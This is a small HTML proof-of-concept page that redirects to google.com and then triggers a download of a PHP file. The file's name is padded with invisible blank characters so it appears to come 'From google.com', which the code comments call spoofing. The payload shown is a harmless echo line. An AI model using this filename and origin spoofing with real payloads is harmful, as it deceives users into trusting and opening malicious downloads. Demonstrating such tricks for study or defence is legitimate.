<!doctype html>
<html lang="en">
<head>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Concealed Download</title>
  <style>
    body {
      height: 100vh;
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: sans-serif;
      background: #fafafa;
      cursor: pointer;
    }
    h1 {
      text-align: center;
      max-width: 420px;
    }
  </style>
</head>
<body>

<h1>
  Tap anywhere.<br>
  You will be redirected to Google first, then the file will be downloaded.
</h1>

<script>
document.addEventListener('click', () => {
  // Step 1: Redirect to Google first
  location.href = 'https://google.com'; 

  // Step 2: After 3 seconds, trigger file download
  setTimeout(() => {
    // Create file content with URL hidden inside
    const payload = '<?php echo "This file is from: https://google.com"; ?>';

    // Encode the PHP content to Base64
    const encodedPayload = btoa(payload);

    // Create a Data URI for the content (this will be treated as a PHP file for download)
    const dataUri = `data:text/php;base64,${encodedPayload}`;

    // Create an <a> tag to trigger the download
    const a = document.createElement('a');
    a.href = dataUri;
    a.download = 'From⠀google.com ⠀⠀⠀⠀⠀ document.php'; // Filename .php for spoofing
    document.body.appendChild(a);
    a.click(); // Trigger the download

    // Clean up after triggering the download
    setTimeout(() => {
      a.remove(); // Clean up the <a> element
    }, 1000);
  }, 3000); // Wait 3 seconds after redirect to trigger the download
}, { once: true });
</script>

</body>
</html>
